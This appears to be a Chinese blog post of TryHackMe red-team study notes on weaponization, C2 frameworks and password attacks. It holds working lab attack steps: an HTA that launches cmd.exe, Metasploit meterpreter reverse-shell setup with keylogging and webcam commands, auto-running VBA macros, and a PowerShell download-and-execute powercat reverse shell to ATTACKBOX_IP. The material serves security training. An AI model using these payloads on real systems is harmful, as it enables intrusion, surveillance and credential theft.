<li><strong>威胁情报</strong>：发现恶意 IP、域名、漏洞等。</li>
<li><strong>企业调查</strong>：分析企业与个人的关系链。</li>
<li><strong>社交工程</strong>：挖掘人员信息（邮箱、社交媒体账户等）。</li>
<li><strong>执法调查</strong>：帮助警方分析犯罪网络。</li>
</ul>
<p>先<br><img src="/../imgs/$%7Bfiilename%7D/image-20250324214707813.png" alt="image-20250324214707813"></p>
<p>再</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250324214729683.png" alt="image-20250324214729683"></p>
<p>双击图标填上域名</p>
<p>再</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250324214812441.png" alt="image-20250324214812441"></p>
<h2 id="Weaponization-武器化-红队"><a href="#Weaponization-武器化-红队" class="headerlink" title="Weaponization(武器化)-红队"></a>Weaponization(武器化)-红队</h2><p><img src="/../imgs/$%7Bfiilename%7D/126ff098c0efeeeb8ab694a09b3359b0.png" alt="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5c549500924ec576f953d9fc&#x2F;room-content&#x2F;126ff098c0efeeeb8ab694a09b3359b0.png"></p>
<p>什么是武器化（Weaponization）</p>
<p>武器化是网络攻击链（Cyber Kill Chain）模型的第二阶段。在此阶段，攻击者会生成并开发自己的恶意代码，通常通过 Word 文档、PDF 等可投递的载荷进行传播 [1]。武器化阶段的目标是利用恶意载荷来攻击目标机器，并获取初始访问权限。</p>
<p>大多数组织都运行 Windows 操作系统，因此它往往成为攻击的主要目标。为了防止安全漏洞，许多组织的环境策略会阻止下载和执行 <strong>.exe</strong> 文件。因此，红队成员通常会构建自定义载荷，并通过多种渠道投递，例如 <strong>网络钓鱼（Phishing）活动、社会工程（Social Engineering）、浏览器或软件漏洞利用、USB 设备、Web 方法</strong> 等。</p>
<p>下图展示了一个武器化的示例，其中一个精心制作的 PDF 或 Microsoft Office 文档被用于投递恶意载荷。该自定义载荷配置为回连至红队基础设施的指挥与控制（C2）环境。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/734a353799fc9f3cd05bb7421ceedd00.png" alt="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5d617515c8cd8348d0b4e68f&#x2F;room-content&#x2F;734a353799fc9f3cd05bb7421ceedd00.png"></p>
<p>欲了解更多关于红队工具包的信息，请访问以下资源：该 GitHub 仓库包含了所有相关内容，包括初始访问、载荷开发、投递方法等。</p>
<p>大多数组织都会阻止或监控 <strong>.exe</strong> 文件在其受控环境中的执行。因此，红队成员通常依赖其他技术来执行载荷，例如 Windows 内置的脚本技术。因此，本任务将重点介绍几种流行且有效的脚本技术，包括：</p>
<ul>
<li><strong>Windows Scripting Host（WSH）</strong></li>
<li><strong>HTML 应用程序（HTA）</strong></li>
<li><strong>Visual Basic 应用程序（VBA）</strong></li>
<li><strong>PowerShell（PSH）</strong></li>
</ul>
<h3 id="Windows-Scripting-Host-WSH"><a href="#Windows-Scripting-Host-WSH" class="headerlink" title="Windows Scripting Host (WSH)"></a>Windows Scripting Host (WSH)</h3><p>Windows Scripting Host 是 Windows 内置的管理工具，用于运行批处理脚本，以自动化和管理操作系统内的任务。</p>
<p>它是 Windows 原生的脚本引擎，主要包括 <strong>cscript.exe</strong>（用于命令行脚本）和 <strong>wscript.exe</strong>（用于 UI 脚本），负责执行各种 Microsoft Visual Basic 脚本（VBScript），包括 <strong>.vbs</strong> 和 <strong>.vbe</strong> 文件。关于 VBScript 的更多信息，请访问相关资源。</p>
<p>需要注意的是，Windows 操作系统中的 VBScript 引擎运行时会继承当前用户的访问权限，因此它对红队人员非常有用。</p>
<p>现在，我们编写一个简单的 VBScript 代码，用于创建一个 Windows 消息框，显示“Welcome to THM”消息。请将以下代码保存为 <strong>hello.vbs</strong> 文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dim message </span><br><span class="line">message = &quot;Welcome to THM&quot;</span><br><span class="line">MsgBox message</span><br></pre></td></tr></table></figure>

<p>在第一行，我们使用 <strong>Dim</strong> 关键字声明变量 <strong>message</strong>。然后，将字符串 <strong>“Welcome to THM”</strong> 存储到 <strong>message</strong> 变量中。接下来，我们使用 <strong>MsgBox</strong> 函数显示变量的内容。关于 <strong>MsgBox</strong> 函数的详细信息，请访问相关资源。</p>
<p>最后，我们使用 <strong>wscript</strong>(也可以使用cscript) 运行 <strong>hello.vbs</strong> 文件，执行后会弹出一个 Windows 消息框，显示“Welcome to THM”消息。</p>
<p>另一个技巧。如果 VBS 文件被列入黑名单，那么我们可以将文件重命名为 .txt 文件，然后使用 wscript 运行它，如下所示，</p>
<p>Terminal</p>
<h3 id="HTML-应用程序（HTA）"><a href="#HTML-应用程序（HTA）" class="headerlink" title="HTML 应用程序（HTA）"></a>HTML 应用程序（HTA）</h3><p>HTA 代表 <strong>“HTML Application”（HTML 应用程序）</strong>，它允许创建一个可下载的文件，其中包含所有显示和渲染所需的信息。HTML 应用程序（HTA）实际上是包含 <strong>JScript</strong> 和 <strong>VBScript</strong> 的动态 HTML 页面。</p>
<p>Windows 内置的 <strong>LOLBINS（Living-off-the-Land Binaries）</strong> 工具 <strong>mshta</strong> 可用于执行 HTA 文件。HTA 文件既可以独立运行，也可以通过 <strong>Internet Explorer</strong> 自动执行。</p>
<hr>
<p>在以下示例中，我们将在载荷中使用 <strong>ActiveXObject</strong> 作为概念验证（PoC），以执行 <strong>cmd.exe</strong>。请参考以下 HTML 代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	var c = &#x27;cmd.exe&#x27;</span><br><span class="line">	new ActiveXObject(&#x27;WScript.Shell&#x27;).Run(c);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>然后，将 <strong>payload.hta</strong> 托管在 Web 服务器上，可以通过攻击机执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ python3 -m http.server 8090</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)</span><br></pre></td></tr></table></figure>

<p>下载即会自动执行</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250325195837580.png" alt="image-20250325195837580"></p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250325195813987.png" alt="image-20250325195813987"></p>
<h4 id="HTA-反向连接"><a href="#HTA-反向连接" class="headerlink" title="HTA 反向连接"></a><strong>HTA 反向连接</strong></h4><p>操作同上只不过是要把文件改为我们的反向shell文件</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250325201218372.png" alt="image-20250325201218372"></p>
<h4 id="通过-Metasploit-发起的恶意-HTA"><a href="#通过-Metasploit-发起的恶意-HTA" class="headerlink" title="通过 Metasploit 发起的恶意 HTA"></a>通过 Metasploit 发起的恶意 HTA</h4><p>这是一种利用 <strong>Metasploit</strong> 生成和托管 <strong>恶意 HTA（HTML Application）文件</strong> 进行攻击的方法。以下是完整的流程，包括如何生成、托管 HTA 文件并获取反向 shell 连接：</p>
<hr>
<h5 id="1-运行-Metasploit"><a href="#1-运行-Metasploit" class="headerlink" title="1. 运行 Metasploit"></a><strong>1. 运行 Metasploit</strong></h5><p>在 Kali 终端输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">msfconsole -q</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-使用-hta-server-模块"><a href="#2-使用-hta-server-模块" class="headerlink" title="2. 使用 hta_server 模块"></a><strong>2. 使用 <code>hta_server</code> 模块</strong></h5><p>在 Metasploit 控制台中，输入以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/misc/hta_server</span><br><span class="line">set LHOST 10.8.232.37       # 设置本机 IP 地址</span><br><span class="line">set LPORT 443               # 设置监听端口</span><br><span class="line">set SRVHOST 10.8.232.37     # 设置服务器 IP 地址</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">exploit                     # 执行攻击模块</span><br></pre></td></tr></table></figure>

<p>成功运行后，Metasploit 会生成一个恶意 HTA 文件，并提供一个 URL，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure>

<p>此时，攻击者的 Kali 机器正在监听 <strong>端口 443</strong>，并等待受害者访问该 HTA 文件。</p>
<hr>
<h5 id="3-受害者执行-HTA-文件"><a href="#3-受害者执行-HTA-文件" class="headerlink" title="3. 受害者执行 HTA 文件"></a><strong>3. 受害者执行 HTA 文件</strong></h5><p>当受害者访问 <code>http://10.8.232.37:8080/TkWV9zkd.hta</code> 时，HTA 文件会执行，并尝试连接回攻击者的 Kali 机器。</p>
<p>在 Kali 终端，你会看到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] 10.10.201.254    hta_server - Delivering Payload</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.201.254</span><br><span class="line">[*] Meterpreter session 1 opened (10.8.232.37:443 -&gt; 10.10.201.254:61629) at 2021-11-16 06:15:46 -0600</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="4-进入-Meterpreter-会话"><a href="#4-进入-Meterpreter-会话" class="headerlink" title="4. 进入 Meterpreter 会话"></a><strong>4. 进入 Meterpreter 会话</strong></h5><p>一旦 Meterpreter 连接成功，可以输入以下命令交互：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sessions -i 1    # 进入会话</span><br></pre></td></tr></table></figure>

<p>然后使用 <code>sysinfo</code> 查看受害者的系统信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : DESKTOP-1AU6NT4</span><br><span class="line">OS              : Windows 10 (10.0 Build 14393)</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : en_US</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 3</span><br><span class="line">Meterpreter     : x86/windows</span><br></pre></td></tr></table></figure>

<p>可以进一步获取 Windows Shell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>

<p>终端输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Process 4124 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\app&gt;</span><br></pre></td></tr></table></figure>

<p>此时，你已经获得了 Windows 受害者系统的命令行访问权限。</p>
<hr>
<h5 id="5-进一步操作"><a href="#5-进一步操作" class="headerlink" title="5. 进一步操作"></a><strong>5. 进一步操作</strong></h5><ul>
<li><p><strong>获取权限</strong>（提权）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>列出当前用户</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>打开摄像头</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; webcam_list</span><br><span class="line">meterpreter &gt; webcam_snap</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>键盘记录</strong>（键盘记录器）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start</span><br><span class="line">meterpreter &gt; keyscan_dump</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>下载文件</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; download C:\Users\admin\Desktop\passwords.txt /root/passwords.txt</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Visual-Basic-应用程序-VBA"><a href="#Visual-Basic-应用程序-VBA" class="headerlink" title="Visual Basic 应用程序 - VBA"></a>Visual Basic 应用程序 - VBA</h3><p>打开</p>
<p>VBA（Visual Basic for Applications）是微软开发的一种编程语言，主要用于 Microsoft Word、Excel、PowerPoint 等微软应用程序。VBA 编程允许自动化几乎所有用户在 Microsoft Office 应用程序中的键盘和鼠标交互操作。</p>
<p>宏（Macros）是指在 Microsoft Office 应用程序中嵌入了 VBA 代码的功能模块。它们可以用于创建自定义函数，通过自动化流程来加快手动任务的执行速度。VBA 的一项重要功能是能够访问 Windows 应用程序编程接口（API）以及其他底层功能。关于 VBA 的更多信息，请访问相关资料。</p>
<p>在本任务中，我们将讨论 VBA 的基础知识，以及攻击者如何利用宏来创建恶意的 Microsoft 文档。要跟进本任务的内容，请确保在任务 2 中部署附带的 Windows 机器。准备就绪后，该机器将通过浏览器访问。</p>
<p>现在，请从“开始”菜单打开 Microsoft Word 2016。打开后点击</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250327093536798.png" alt="image-20250327093536798"></p>
<p>点击创建</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250327094143036.png" alt="image-20250327094143036"></p>
<p>输入实验代码然后点击f5运行即可</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250327094213865.png" alt="image-20250327094213865"></p>
<p>然后后我们可以利用AutoOpen和Document_open是文档打开及立即执行</p>
<p>我们直接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sub Document_Open()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub AutoOpen()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub THM()</span><br><span class="line">    Dim payload As String</span><br><span class="line">    payload = &quot;ji.vbs&quot; //启动计算机的程序</span><br><span class="line">    CreateObject(&quot;Wscript.Shell&quot;).Run payload, 0</span><br><span class="line">End Sub</span><br><span class="line">//</span><br><span class="line">在上述示例中，函数的第一行代码是Dim payload As String，表示使用Dim关键字将payload变量声明为字符串，然后是payload = &quot;ji.vbs&quot;，表示指定载荷名称，最后是CreateObject(&quot;Wscript.Shell&quot;).Run payload，表示创建一个Windows脚本宿主(WSH)对象并运行payload。</span><br></pre></td></tr></table></figure>



<p><img src="/../imgs/$%7Bfiilename%7D/image-20250327095356129.png" alt="image-20250327095356129"></p>
<p>接下来我们就可以使用Metasploit框架创建一个内存meterpreter载荷，以实现攻击机接收反向shell。</p>
<p>需要将生成的载荷的内容中的<code>Workbook_Open()</code>函数更改为<code>Document_Open()</code>函数，从而使其适合在MS word文档中运行。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250327104028056.png" alt="image-20250327104028056"></p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250327110329196.png" alt="image-20250327110329196"></p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250327110549217.png" alt="image-20250327110549217"></p>
<h3 id="PowerShell（PSH）"><a href="#PowerShell（PSH）" class="headerlink" title="PowerShell（PSH）"></a>PowerShell（PSH）</h3><p>PowerShell 是一种面向对象的编程语言，在 .NET 框架的动态语言运行时（DLR）上执行，但对于某些旧版用途存在例外。更多关于 PowerShell 的信息，请查看 TryHackMe 的 <strong>Hacking with PowerShell</strong> 课程。</p>
<p>红队人员依赖 PowerShell 执行各种任务，包括初始访问、系统枚举等。让我们先创建一个简单的 PowerShell 脚本，打印 <strong>“Welcome to the Weaponization Room!”</strong>，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Write-Output &quot;Welcome to the Weaponization Room!&quot;</span><br></pre></td></tr></table></figure>

<p>将文件保存为 <strong>thm.ps1</strong>。该脚本使用 <code>Write-Output</code> 命令在命令提示符中打印 <strong>“Welcome to the Weaponization Room!”</strong>。现在让我们运行它并查看结果。</p>
<h4 id="运行-PowerShell-脚本"><a href="#运行-PowerShell-脚本" class="headerlink" title="运行 PowerShell 脚本"></a>运行 PowerShell 脚本</h4><p>在 CMD 中执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\thm\Desktop&gt;powershell -File thm.ps1</span><br></pre></td></tr></table></figure>

<p>但可能会遇到以下错误：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more</span><br><span class="line">information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="执行策略（Execution-Policy）"><a href="#执行策略（Execution-Policy）" class="headerlink" title="执行策略（Execution Policy）"></a>执行策略（Execution Policy）</h4><p>PowerShell 的执行策略是一种安全选项，用于防止系统运行恶意脚本。出于安全考虑，Microsoft 默认禁用了 PowerShell 脚本（.ps1）的执行。默认执行策略为 <strong>Restricted</strong>，这意味着可以运行单个命令，但不允许运行任何脚本。</p>
<p>可以使用以下命令查看当前执行策略：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\thm&gt; Get-ExecutionPolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure>

<p>如果需要更改执行策略，可以运行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\thm\Desktop&gt; Set-ExecutionPolicy -Scope CurrentUser RemoteSigned</span><br></pre></td></tr></table></figure>

<p>执行后，PowerShell 将提示用户确认更改：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Execution Policy Change</span><br><span class="line">The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose</span><br><span class="line">you to security risks described in the about_Execution_Policies help topic at</span><br><span class="line">http://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?</span><br><span class="line">[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is &quot;N&quot;):</span><br></pre></td></tr></table></figure>

<p>输入 <code>A</code>（Yes to All）以应用更改。</p>
<hr>
<h4 id="绕过执行策略（Bypass-Execution-Policy）"><a href="#绕过执行策略（Bypass-Execution-Policy）" class="headerlink" title="绕过执行策略（Bypass Execution Policy）"></a>绕过执行策略（Bypass Execution Policy）</h4><p>Microsoft 允许用户通过参数修改执行策略，以便运行 PowerShell 脚本。例如，我们可以使用 <strong>bypass</strong> 策略，完全解除执行限制：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\thm\Desktop&gt;powershell -ex bypass -File thm.ps1</span><br></pre></td></tr></table></figure>

<p>执行后，屏幕将输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome to Weaponization Room!</span><br></pre></td></tr></table></figure>

<p>现在，我们尝试使用 PowerShell 编写的工具 <strong>powercat</strong> 获取反向 Shell。</p>
<h4 id="1-在攻击机上下载-Powercat"><a href="#1-在攻击机上下载-Powercat" class="headerlink" title="1. 在攻击机上下载 Powercat"></a>1. 在攻击机上下载 Powercat</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/besimorhino/powercat.git</span><br><span class="line">Cloning into &#x27;powercat&#x27;...</span><br><span class="line">Receiving objects: 100% (239/239), done.</span><br><span class="line">Resolving deltas: 100% (72/72), done.</span><br></pre></td></tr></table></figure>

<h4 id="2-启动-Web-服务器托管-Powercat"><a href="#2-启动-Web-服务器托管-Powercat" class="headerlink" title="2. 启动 Web 服务器托管 Powercat"></a>2. 启动 Web 服务器托管 Powercat</h4><p>切换到 <strong>powercat</strong> 目录并启动 Web 服务器（监听 8080 端口）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd powercat</span><br><span class="line">python3 -m http.server 8080</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...</span><br></pre></td></tr></table></figure>

<h4 id="3-监听端口接收反向-Shell"><a href="#3-监听端口接收反向-Shell" class="headerlink" title="3.监听端口接收反向 Shell"></a>3.监听端口接收反向 Shell</h4><p>在攻击机上使用 <code>nc</code> 监听 1337 端口，以接收来自目标机器的连接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 1337</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="4-在目标机器上执行-PowerShell-载荷"><a href="#4-在目标机器上执行-PowerShell-载荷" class="headerlink" title="4. 在目标机器上执行 PowerShell 载荷"></a>4. 在目标机器上执行 PowerShell 载荷</h4><p>在受害者机器上，使用以下命令下载并执行 Powercat 脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\thm\Desktop&gt; powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://ATTACKBOX_IP:8080/powercat.ps1&#x27;);powercat -c ATTACKBOX_IP -p 1337 -e cmd&quot;</span><br></pre></td></tr></table></figure>

<p>执行上述命令后，受害者机器将从攻击机的 Web 服务器（监听 8080 端口）下载 <code>powercat.ps1</code> 载荷，并在本地执行它，最终通过 <code>cmd.exe</code> 发送反向连接至攻击机的 1337 端口。</p>
<hr>
<h4 id="5-在攻击机上接收反向-Shell"><a href="#5-在攻击机上接收反向-Shell" class="headerlink" title="5. 在攻击机上接收反向 Shell"></a>5. 在攻击机上接收反向 Shell</h4><p>在攻击机上监听 <code>1337</code> 端口后，几秒钟内即可收到受害者的回连：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 1337</span><br><span class="line">listening on [any] 1337 ...</span><br><span class="line">10.10.12.53: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.8.232.37] from (UNKNOWN) [10.10.12.53] 49804</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\thm&gt;</span><br></pre></td></tr></table></figure>

<p>此时，攻击机成功获得了目标机器的 Shell 访问权限。</p>
<h3 id="CS2"><a href="#CS2" class="headerlink" title="CS2"></a>CS2</h3><h4 id="什么是命令与控制（C2）？"><a href="#什么是命令与控制（C2）？" class="headerlink" title="什么是命令与控制（C2）？"></a>什么是命令与控制（C2）？</h4><p>C2 框架是后渗透框架，允许红队成员协作并控制已被攻陷的机器。C2 被认为是红队在进攻性网络行动中最重要的工具之一。C2 框架提供了快速且简便的方法来：</p>
<ul>
<li>生成各种恶意载荷</li>
<li>枚举已攻陷的机器&#x2F;网络</li>
<li>执行权限提升和跳跃</li>
<li>横向移动</li>
<li>以及其他许多操作</li>
</ul>
<p>我们将简要介绍一些流行的 C2 框架，包括 Cobalt Strike、PowerShell Empire 和 Metasploit。这些框架大多数旨在为红队操作提供一个方便的环境，帮助团队在获得系统初步访问权限后进行共享和沟通。</p>
<h4 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h4><p>Cobalt Strike 是一个商业化框架，专注于对抗模拟和红队操作。它结合了远程访问工具、后渗透能力和独特的报告系统。它为代理提供了高级技术，用于建立隐蔽通信并执行各种操作，包括键盘记录、文件上传与下载、VPN 部署、权限提升技术、mimikatz、端口扫描以及最先进的横向移动。</p>
<h4 id="PowerShell-Empire"><a href="#PowerShell-Empire" class="headerlink" title="PowerShell Empire"></a>PowerShell Empire</h4><p>PowerShell Empire 是一个开源框架，帮助红队操作员和渗透测试人员在多台服务器之间使用密钥和共享密码进行协作。它是一个基于 PowerShell 和 Python 代理的渗透框架，专注于 Windows 和 Active Directory 环境的客户端和后渗透操作。如果您想了解更多有关 PowerShell Empire 的信息，建议尝试这个课程：Empire。</p>
<h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>Metasploit 是一个广泛使用的渗透框架，提供了各种技术和工具，便于轻松执行黑客攻击。它是一个开源框架，被认为是渗透测试和红队操作的主要工具之一。Metasploit 是我们在此课程中使用的工具之一，用于在武器化阶段生成载荷。如果您想了解更多关于 Metasploit 框架的信息，建议查看 Metasploit 模块。</p>
<p>大多数 C2 框架使用本课程中提到的技术作为初步访问阶段的准备工作。如需详细了解 C2 框架，欢迎查阅 <strong>Intro to C2</strong> 课程。</p>
<p>cs在</p>
<h2 id="密码攻击"><a href="#密码攻击" class="headerlink" title="密码攻击"></a>密码攻击</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>我们将讨论获取和生成自定义密码列表的方法。以下是我们将探讨的一些主题：</p>
<ul>
<li>密码分析（Password profiling）</li>
<li>密码攻击技术（Password attacks techniques）</li>
<li>在线密码攻击（Online password attacks）</li>
</ul>
<h4 id="什么是密码？"><a href="#什么是密码？" class="headerlink" title="什么是密码？"></a>什么是密码？</h4><p>密码是一种身份验证方法，允许个人访问计算机系统或应用程序。使用密码可以确保只有账户所有者才能访问系统。然而，如果密码被共享或落入不法分子手中，未经授权的更改可能会发生，甚至可能导致系统状态受损或文件系统被破坏。</p>
<p>密码通常由字母、数字和符号的组合构成，用户可以自行决定如何创建密码。密码的集合通常被称为**字典（dictionary）**或**密码列表（wordlist）**。低复杂度、易猜测的密码经常出现在各种公开披露的密码泄露数据中。例如，常见的弱密码包括 <strong>password</strong>、<strong>123456</strong>、<strong>111111</strong> 等。</p>
<p>由于许多用户使用简单密码，攻击者在对目标或服务进行密码攻击时，往往可以快速破解密码。因此，选择一个<strong>强密码</strong>是最佳实践，使其难以被猜测或破解。强密码不应是常见单词或字典中的词汇，并且应至少包含 <strong>8 个字符</strong>，包括大小写字母、数字和符号（例如：*&amp;^%$#@）。</p>
<p>有时，公司会制定自己的密码策略，并强制用户在创建密码时遵循相关指南。这有助于确保用户不会在组织内部使用常见或弱密码，从而减少<strong>暴力破解</strong>等攻击向量。例如，密码可能需要至少 <strong>8 个字符</strong>，包含字母、数字以及至少一个特殊符号。然而，如果攻击者掌握了密码策略，就可以根据该策略生成一个满足要求的密码列表，从而提高破解成功的可能性。</p>
<h4 id="密码的安全性如何？"><a href="#密码的安全性如何？" class="headerlink" title="密码的安全性如何？"></a>密码的安全性如何？</h4><p>密码是访问在线账户或计算机系统的一种保护方法，其主要目标是确保安全性，并防止密码被共享或泄露。</p>
<p>那么，密码到底有多安全？答案取决于多个因素。通常，密码存储在<strong>文件系统</strong>或<strong>数据库</strong>中，保护密码的安全至关重要。过去曾出现一些公司将密码以<strong>明文</strong>存储在文档中的情况，例如 <strong>2014 年 Sony 数据泄露事件</strong>。在这种情况下，一旦攻击者获得文件系统访问权限，就可以轻松获取并重用这些密码。</p>
<p>另一方面，某些系统会使用<strong>哈希函数</strong>或<strong>加密算法</strong>来存储密码，从而提高安全性。即使攻击者获得了系统访问权限，也需要额外的破解工作才能获取密码。我们将在后续任务中介绍<strong>哈希破解</strong>相关内容。</p>
<h3 id="密码攻击技术"><a href="#密码攻击技术" class="headerlink" title="密码攻击技术"></a><strong>密码攻击技术</strong></h3><p>在本节中，我们将讨论可用于执行密码攻击的各种技术，包括：</p>
<ul>
<li><strong>字典攻击（Dictionary Attack）</strong></li>
<li><strong>暴力破解（Brute-Force Attack）</strong></li>
<li><strong>基于规则的攻击（Rule-Based Attack）</strong></li>
<li><strong>猜测攻击（Guessing Attack）</strong></li>
</ul>
<p>上述所有攻击方式都被认为是<strong>主动“在线”攻击</strong>，攻击者需要与目标系统进行通信，以获取密码并实现未授权访问。</p>
<hr>
<h4 id="密码破解-vs-密码猜测"><a href="#密码破解-vs-密码猜测" class="headerlink" title="密码破解 vs. 密码猜测"></a><strong>密码破解 vs. 密码猜测</strong></h4><p>本节将从网络安全的角度讨论**密码破解（Password Cracking）**的相关术语，并介绍密码破解与密码猜测的主要区别。此外，我们还将演示一些用于密码破解的工具，例如 <strong>Hashcat</strong> 和 <strong>John the Ripper</strong>。</p>
<p>**密码破解（Password Cracking）**是一种通过分析加密或哈希数据来发现明文密码的技术。攻击者可能从被入侵的计算机中获取加密或哈希密码，或者通过监听网络流量获取密码数据。一旦获取了哈希密码，攻击者就可以利用各种工具对其进行破解，以恢复原始密码。</p>
<p>密码破解被认为是渗透测试（Penetration Testing）中一种传统的技术，其主要目标是<strong>让攻击者提升权限，以访问计算机系统或网络</strong>。</p>
<p>尽管**密码猜测（Password Guessing）<strong>和</strong>密码破解（Password Cracking）**在信息安全领域常被提及，但两者存在显著差异：</p>
<table>
<thead>
<tr>
<th><strong>密码猜测（Password Guessing）</strong></th>
<th><strong>密码破解（Password Cracking）</strong></th>
</tr>
</thead>
<tbody><tr>
<td>主要针对<strong>在线协议和服务</strong></td>
<td>主要在<strong>本地或受控系统</strong>上执行</td>
</tr>
<tr>
<td>由于需要<strong>与目标系统通信</strong>，通常较慢</td>
<td>速度较快，受计算能力影响</td>
</tr>
<tr>
<td>每次尝试都会产生<strong>登录失败日志</strong>，易被检测</td>
<td>通常不会触发目标系统的警报</td>
</tr>
<tr>
<td>可能会导致<strong>账户被锁定</strong>（如配置安全机制）</td>
<td>不会影响目标账户状态</td>
</tr>
</tbody></table>
<p>在<strong>Web 应用或其他在线系统</strong>上进行密码猜测攻击通常需要发送独立的请求，每次尝试都会生成新的日志记录。因此，密码猜测攻击通常容易被检测，并且在安全性较高的系统上，可能会导致账户被锁定。</p>
<p>相较之下，<strong>密码破解</strong>通常是<strong>在攻击者本地执行</strong>，不会直接与目标系统交互，因此<strong>更难被检测</strong>，但破解速度取决于计算能力和哈希算法的复杂性。</p>
